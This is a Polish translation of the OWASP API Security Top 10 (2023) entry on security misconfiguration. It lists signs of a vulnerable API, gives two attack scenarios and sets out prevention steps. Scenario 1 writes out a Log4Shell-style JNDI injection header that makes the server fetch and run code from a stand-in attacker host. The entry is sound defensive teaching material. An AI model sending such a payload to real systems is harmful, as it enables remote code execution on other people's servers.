# API8:2023 Błędna konfiguracja zabezpieczeń

| Źródła zagrożeń/Wektory ataku | Słaby punkt bezpieczeństwa | Wpływ |
| - | - | - |
| Zależne od API : Możliwość wykorzystania **Łatwa** | Powszechność **Powszechna** : Wykrywalność **Łatwa** | Techniczny **Poważny** : Zależny od biznesu |
| Atakujący często próbują znaleźć niezałatane błędy, typowe endpointy, usługi działające z niebezpieczną konfiguracją domyślną lub niezabezpieczone pliki i katalogi, aby uzyskać nieautoryzowany dostęp do systemu lub wiedzę na jego temat. Większość tych informacji jest publicznie znana i mogą być dostępne gotowe exploity. | Błędna konfiguracja zabezpieczeń może wystąpić na dowolnym poziomie stosu API, od poziomu sieci po poziom aplikacji. Dostępne są zautomatyzowane narzędzia do wykrywania i wykorzystywania błędów konfiguracji, takich jak zbędne usługi lub przestarzałe opcje. | Błędy konfiguracji zabezpieczeń ujawniają nie tylko wrażliwe dane użytkowników, ale także szczegóły systemu, które mogą doprowadzić do całkowitego przejęcia serwera. |

## Czy API jest podatne?

API może być podatne, jeśli:

* W którejkolwiek części stosu API brakuje odpowiedniego utwardzenia
  zabezpieczeń lub uprawnienia w usługach chmurowych są nieprawidłowo
  skonfigurowane
* Brakuje najnowszych poprawek bezpieczeństwa lub systemy są nieaktualne
* Włączone są zbędne funkcje (np. metody HTTP, funkcje logowania)
* Serwery w łańcuchu serwerów HTTP przetwarzają przychodzące żądania
  w niespójny sposób
* Brakuje zabezpieczenia Transport Layer Security (TLS)
* Do klientów nie są wysyłane dyrektywy bezpieczeństwa lub kontroli pamięci
  podręcznej
* Brakuje polityki Cross-Origin Resource Sharing (CORS) lub jest ona
  nieprawidłowo ustawiona
* Komunikaty o błędach zawierają ślady stosu lub ujawniają inne wrażliwe
  informacje

## Przykładowe scenariusze ataków

### Scenariusz nr 1

Serwer backendu API prowadzi log dostępu zapisywany przez popularne narzędzie
do logowania typu open source od strony trzeciej, które obsługuje rozwijanie
symboli zastępczych oraz wyszukiwania JNDI (Java Naming and Directory
Interface). Obie funkcje są domyślnie włączone. Dla każdego żądania do pliku
logu zapisywany jest nowy wpis według wzorca:
`<method> <api_version>/<path> - <status_code>`.

Atakujący wysyła następujące żądanie API, które zostaje zapisane w pliku logu
dostępu:

```
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```

Z powodu niebezpiecznej konfiguracji domyślnej narzędzia do logowania oraz
liberalnej polityki ruchu wychodzącego narzędzie, zapisując odpowiedni wpis
w logu dostępu i rozwijając wartość nagłówka żądania `X-Api-Version`, pobierze
i wykona obiekt `Malicious.class` z serwera zdalnie kontrolowanego przez
atakującego.

### Scenariusz nr 2

Serwis społecznościowy oferuje funkcję wiadomości prywatnych („Direct Message”),
która pozwala użytkownikom prowadzić prywatne rozmowy. Aby pobrać nowe
wiadomości z określonej rozmowy, strona wysyła następujące żądanie API
(interakcja użytkownika nie jest wymagana):

```
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
```

Ponieważ odpowiedź API nie zawiera nagłówka odpowiedzi HTTP `Cache-Control`,
prywatne rozmowy trafiają do pamięci podręcznej przeglądarki, co pozwala
atakującym odczytać je z plików pamięci podręcznej przeglądarki w systemie
plików.

## Jak zapobiegać

Cykl życia API powinien obejmować:

* Powtarzalny proces utwardzania, który pozwala szybko i łatwo wdrożyć
  odpowiednio zabezpieczone środowisko
* Zadanie polegające na przeglądzie i aktualizacji konfiguracji w całym stosie
  API. Przegląd powinien obejmować: pliki orkiestracji, komponenty API i usługi
  chmurowe (np. uprawnienia zasobników S3)
* Zautomatyzowany proces ciągłej oceny skuteczności konfiguracji i ustawień we
  wszystkich środowiskach

Ponadto:

* Upewnij się, że cała komunikacja API od klienta do serwera API oraz do
  wszelkich komponentów podrzędnych/nadrzędnych odbywa się przez szyfrowany
  kanał komunikacji (TLS), niezależnie od tego, czy jest to API wewnętrzne,
  czy publiczne.
* Określ precyzyjnie, za pomocą których metod HTTP można uzyskać dostęp do
  każdego API: wszystkie pozostałe metody HTTP powinny być wyłączone (np.
  HEAD).
* API, do których dostęp mają uzyskiwać klienci działający w przeglądarce (np.
  frontend aplikacji webowej), powinny co najmniej:
    * implementować właściwą politykę Cross-Origin Resource Sharing (CORS)
    * zawierać odpowiednie nagłówki bezpieczeństwa
* Ogranicz przychodzące typy treści/formaty danych do tych, które spełniają
  wymagania biznesowe/funkcjonalne.
* Upewnij się, że wszystkie serwery w łańcuchu serwerów HTTP (np. moduły
  równoważenia obciążenia, odwrotne i przekazujące serwery proxy oraz serwery
  backendu) przetwarzają przychodzące żądania w jednolity sposób, aby uniknąć
  problemów z desynchronizacją.
* Tam, gdzie ma to zastosowanie, zdefiniuj i egzekwuj schematy ładunków
  wszystkich odpowiedzi API, w tym odpowiedzi o błędach, aby zapobiec
  odsyłaniu atakującym śladów wyjątków i innych cennych informacji.

## Źródła

### OWASP

* [OWASP Secure Headers Project][1]
* [Configuration and Deployment Management Testing - Web Security Testing
  Guide][2]
* [Testing for Error Handling - Web Security Testing Guide][3]
* [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]

### Zewnętrzne

* [CWE-2: Environmental Security Flaws][5]
* [CWE-16: Configuration][6]
* [CWE-209: Generation of Error Message Containing Sensitive Information][7]
* [CWE-319: Cleartext Transmission of Sensitive Information][8]
* [CWE-388: Error Handling][9]
* [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response
  Smuggling')][10]
* [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]
* [Guide to General Server Security][12], NIST
* [Let's Encrypt: a free, automated, and open Certificate Authority][13]

[1]: https://owasp.org/www-project-secure-headers/
[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README
[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README
[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
[5]: https://cwe.mitre.org/data/definitions/2.html
[6]: https://cwe.mitre.org/data/definitions/16.html
[7]: https://cwe.mitre.org/data/definitions/209.html
[8]: https://cwe.mitre.org/data/definitions/319.html
[9]: https://cwe.mitre.org/data/definitions/388.html
[10]: https://cwe.mitre.org/data/definitions/444.html
[11]: https://cwe.mitre.org/data/definitions/942.html
[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final
[13]: https://letsencrypt.org/
